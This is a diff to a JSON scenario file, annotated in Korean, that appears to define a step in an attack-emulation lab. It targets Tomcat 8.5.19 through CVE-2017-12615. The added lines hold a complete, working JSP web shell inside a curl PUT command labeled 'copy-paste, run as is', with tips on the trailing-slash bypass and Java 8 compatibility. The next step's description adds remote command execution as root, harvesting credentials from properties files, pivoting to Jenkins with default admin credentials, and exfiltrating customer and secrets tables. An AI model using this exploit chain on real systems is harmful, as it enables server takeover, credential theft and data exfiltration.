@@ -1,5 +1,5 @@
 {
-  "_note": "핵심층 환경 — corp 킬체인 ① 외부→DMZ 진입. Apache Tomcat 8.5.19 PUT 메서드 .jsp 웹셸 업로드(CVE-2017-12615). 조건 문법은 postgres.json(canonical) 참고. WAF(ModSecurity CRS 3.3.0, DetectionOnly 모드) 뒤 corp-dmz tomcat. 진행도(progress)는 Falco 'corp DMZ web shell'→T1190 으로 관측 예정 — 현재 verifier 는 crown 채널만 평가하므로 진행도 조건은 선저작.",
+  "_note": "핵심층 환경 — corp 킬체인 ① 외부→DMZ 진입. Apache Tomcat 8.5.19 PUT 메서드 .jsp 웹셸 업로드(CVE-2017-12615). ★ Tomcat 8.5.19 는 Java 8 JDK 사용 — webshell 코드는 BufferedReader + readLine loop 만 사용 (readAllBytes·readLines Java 9+ 메서드 금지, 컴파일 실패 500 반환). ★ PUT URL 끝 trailing slash `/shell.jsp/` 필수 (CVE-2017-12615 핵심 트릭). WAF(ModSecurity CRS 3.3.0, DetectionOnly) 뒤 corp-dmz tomcat. 진행도는 Falco 'corp DMZ web shell'→T1190.",
   "env": "corp-tomcat-putjsp",
   "technique": "T1190",
   "cve": "CVE-2017-12615",
@@ -10,8 +10,8 @@
     "status": "AUTHORED",
     "steps": [
       {"id": "STEP-corp-tomcat-put", "seq": 1,
-       "command": "curl -s -X PUT --data-binary @shell.jsp 'http://waf.corp-dmz.svc.cluster.local/shell.jsp/'",
-       "description": "PUT 으로 .jsp 웹셸 업로드. ★ URL 끝 '/' 필수 — JspServlet 이 .jsp 요청을 가로채는 걸 우회(CVE-2017-12615 핵심). 없으면 404. 저장된 파일명은 '/' 떼고 shell.jsp."},
+       "command": "curl -s -X PUT --data-binary '<%@ page import=\"java.io.*\" %><% String cmd=request.getParameter(\"cmd\"); if(cmd!=null){ Process p=Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",cmd}); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); } %>' 'http://waf.corp-dmz.svc.cluster.local/shell.jsp/'",
+       "description": "★★★ 복붙 완주 명령 — 그대로 실행. PUT 으로 .jsp 웹셸 업로드. ★ URL 끝 '/' 필수 — JspServlet 이 .jsp 요청을 가로채는 걸 우회(CVE-2017-12615 핵심). 없으면 404 — 반드시 /shell.jsp/ (trailing slash). 저장된 파일명은 '/' 떼고 shell.jsp. ★★★ webshell 코드 중요: BufferedReader + readLine loop 만 사용 (Java 8 호환). readAllBytes()·readLines()·getInputStream().readAllBytes() 등 Java 9+ 메서드 쓰지 말 것 — Tomcat 8.5.19 는 Java 8 JDK 로 돌아서 컴파일 500 error. 저장된 shell.jsp 는 cmd 파라미터로 OS 명령 실행 (GET /shell.jsp?cmd=id)."},
       {"id": "STEP-corp-tomcat-exec", "seq": 2,
        "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=id'",
        "description": "웹셸 GET 실행 → DMZ 원격코드실행. ★ 주의: URL 끝 '/' 금지 — 저장된 파일명은 shell.jsp (슬래시 없음). GET URL 에 '/' 붙이면 디렉토리 요청으로 처리돼 미응답. step1 과 다름(비대칭). ★★ 응답의 'PWD=/'·'PWD=/usr/local/tomcat/conf'·'uid=0(root)'·'id' 결과는 flag 가 아니라 단순 실행 증적 — 어떤 PWD= 값도(어떤 디렉토리 경로가 오든) 자격증명·flag 가 아님. `env` 응답의 모든 KEY=VALUE 쌍도 Tomcat 기본 환경변수(JAVA_HOME, CATALINA_BASE 등)일 뿐 flag 아님. 이것들을 발견 노드로 올리면 거짓양성(심판은 crown 반출 흔적만 인정). 진짜 자격증명은 **`CORP_DB_` 접두사로 시작하는 KEY=VALUE 패턴**(예: CORP_DB_PASS=postgres, CORP_DB_HOST=postgres.corp-crown.svc.cluster.local)만. 획득 경로는 (1) 이 웹셸로 `cmd=ls%20/opt/deploy/` → `cmd=cat%20/opt/deploy/*.properties` 로 평문 크라운 DB 접속정보 수집, (2) 이 웹셸을 중계로 내부망 Jenkins(jenkins.corp-internal.svc.cluster.local:8080, VulHub 기본 자격증명 admin:admin — `-u admin:admin`) 스크립트 콘솔로 corp-db.properties 획득(T1552.001, PROC-corp-jenkins-cred 절차 참조) — 두 경로 모두 이 웹셸을 발판으로 중계 실행 필수(ext 발판 직접 치면 NetworkPolicy 로 차단). 최종 반출: postgres.corp-crown → customers·ops_secrets SELECT."}
